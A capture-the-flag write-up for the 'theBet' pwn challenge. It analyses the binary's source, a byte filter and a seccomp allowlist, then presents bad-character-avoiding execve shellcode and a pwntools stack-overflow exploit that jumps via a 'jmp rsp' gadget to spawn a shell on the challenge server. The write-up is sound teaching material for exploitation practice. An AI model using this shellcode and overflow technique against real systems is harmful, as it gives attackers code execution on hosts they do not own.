# theBet

Challenge Points: 400

No of Solves:

Challenge Author: [d1g174l_f0r7r355](https://twitter.com/BhaskaraShravya)

This challenge was a shellcode based challenge, with a few bad characters in check. 

## Preliminary Analysis:
```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : FULL

```

## Analyzing the binary:

### main().
```

char name[10];
char choice;
initialize();
puts("Welcome to the Bet! You are standing among the world's best lawyers, politicians and criminals. \n\nYou approach a young lawyer not more than 24 years of age. As you converse with him, you come to know about his reputation. The next moment you know, you find yourself debating which is better - Capital Punishment or Life Imprisonment. \n\nYou are of the opinion that Capital Punishment is better as a quick death would mean less pain as compared to life of solitude in the cell. Your friend believes otherwise. \n\nYou both decide on writing down your views and handing them over to a third party, (a criminal) so as to decide who's opinion is correct. \n\nThe criminal however states that the one who loses the debate shall either face Capital Punishment or Life Imprisonment depending on what the winning party chooses. \n\nGive us your name: ");
fgets(name, 11, stdin);
puts("\n1. Capital Punishment\n2. Life Imprisonment\nYour choice: ");

scanf("%c", &choice);
getchar();


if(choice == '1'){
Capital_Punishment(bad_chars);
}else if(choice == '2'){
Life_Imprisonment(bad_chars);
}else{
puts("That is not a valid choice\n");
exit(0);
}

setup_seccomp();
return 0;
```
We see that we are presented with two choices, `Capital_Punishment` and `Life_Imprisonment`. Also `bad_chars` is passed as an argument to each of these functions.

From the source code given, one can form the set of bad characters to be:
`bad_chars = {'\x0d', '\x50', '\x2e', '\xbb', '\xb0', '\x83', '\xf6', '\x10', '\xaa', '\xd2', '\x98', '\x99', '\x30', '\x31'}`.

Let us go ahead and check out each of the functions `Capital_Punishment` and `Life_Imprisonment`. 


### Capital_Punishment:

```
char description[30];

puts("Describe your argument: ");

len = read(0, description, 100);

for(i = 0; i<len; i++){
for(j = 0; j<14; j++){
if(description[i] == bad_chars[j]){
puts("\nI'm sorry you lost! You will be imprisoned for life.. :(\n");
exit(0);
}
}
}

```
From the above source code for `Capital_Punishment`, we see that if any character in our input string consists of one of the above `bad_chars`, the program will simply exit. Since NX is disabled, one can assume our payload to contain a shellcode. 

### Life_Imprisonment:
```
char description[30];

puts("Describe your argument: ");

len = read(0, description, 100);

for(i = 0; i<len; i++){
for(j = 0; j<14; j++){
if(description[i] == bad_chars[j]){
puts("\nI'm sorry you lost! You will be executed.. :(\n");
exit(0);
}
}
}

```
Similar to the source code of Capital_Punishment, our input is checked if it contains of the bad characters, and simply exits if it does. 


### seccomp:
**What is seccomp?**
One can assume a seccomp filter to have the following job! It is used to filter out and prevent use of bad system calls. At times seccomp filters are used to allow only `read()`, `write()` and `open()` syscalls. However, in the given challenge, upond observing closely at `setup_seccomp()`, we notice that `execve()` and `execveat()` are allowed, however none of the `read()`, `write()` or `open()` syscalls are allowed. 
```
int ret = 0;

ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(close), 0);
ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(lseek), 0);
ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(mprotect), 0);
ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(execve), 0);
ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(execveat), 0);
ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(brk), 0);
ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(writev), 0);
ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(kill), 0);
ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(getuid), 0);
ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(getgid), 0);
ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
ret |= seccomp_load(ctx);

  if (ret) {
    exit(1);
  }

```
Anyways, since `execve()` is allowed, our next goal is to construct a 64 bit execve shellcode, keeping in mind the bad characters which shouldn't be present in our input payload. 

## Writing the shellcode:

(Note: there could be many ways to write the same piece of shellcode and avoid the list of bad characters, however I will discuss my approach.)

Before we move onto shellcode scripting, let us make sure of the arguments to be placed into registers while making use of an execve syscall. 

For a 64 bit, execve syscall, 
 - `rax` : `0x3b` (syscall number)
 - `rdi` : `address containing "/bin/sh"`
 - `rsi` : `0x0`
 - `rdx` : `0x0`

```python=
shell = ''
shell += 'push rbx\n'
shell += 'push 0x0\n'			
shell += 'pop rsi\n'				# making sure rsi contains 0x0
shell += 'push rsi\n'
shell += 'pop rdx\n'				# making sure rdx contains 0x0
shell += 'push rbx\n'
shell += 'push 0x68732f\n'			# pushing '/sh\x00' onto the stack first
shell += 'push rsp\n'
shell += 'pop rbx\n'
shell += 'shl qword ptr [rbx], 0x20\n'	# left shifting by 32 bytes, with this we ensure "/sh\x00" is written as the upper 4 bytes and the result is stored in rbx.
shell += 'push 0x6e69622f\n'			# pushing '/bin' onto the stack
shell += 'pop rax\n'
shell += 'add qword ptr [rbx], rax\n'		# adding the '/bin' as the lower 4 bytes to rbx which contains '/sh\x00' as the upper 4 bytes. 
shell += 'push rbx\n'
shell += 'pop rdi\n'				# placing "/bin/sh\x00" into rdi
shell += 'push 0x3b\n'				# updating rax to contain syscall number
shell += 'pop rax\n'
shell += 'syscall\n'				# syscall
```

## Exploit:

```python=

from pwn import *

def shellcode():

	# execve syscall
	shell = ''
	shell += 'push rbx\n'
	shell += 'push 0x0\n'
	shell += 'pop rsi\n'
	shell += 'push rsi\n'
	shell += 'pop rdx\n'
	shell += 'push rbx\n'
	shell += 'push 0x68732f\n'
	shell += 'push rsp\n'
	shell += 'pop rbx\n'
	shell += 'shl qword ptr [rbx], 0x20\n'
	shell += 'push 0x6e69622f\n'
	shell += 'pop rax\n'
	shell += 'add qword ptr [rbx], rax\n'
	shell += 'push rbx\n'
	shell += 'pop rdi\n'
	shell += 'push 0x3b\n'
	shell += 'pop rax\n'
	shell += 'syscall\n'
	
	shell = asm(shell)
	print(disasm(shell))

	return shell

if __name__=="__main__":
	context.arch='amd64'
	#p = process('./theBet')
	p = remote('gc1.eng.run', 31795)
	#gdb.attach(p)
	
	p.recv()
	p.sendline('aaaa')
	p.recv()
	p.sendline('1')
	
	p.recv()
	pay = '\x90'*(0x28)
	pay += p64(0x000000000040127e)# jmp rsp
	pay += shellcode()
	print(len(pay))
	
	p.sendline(pay)
	
	p.interactive()
```


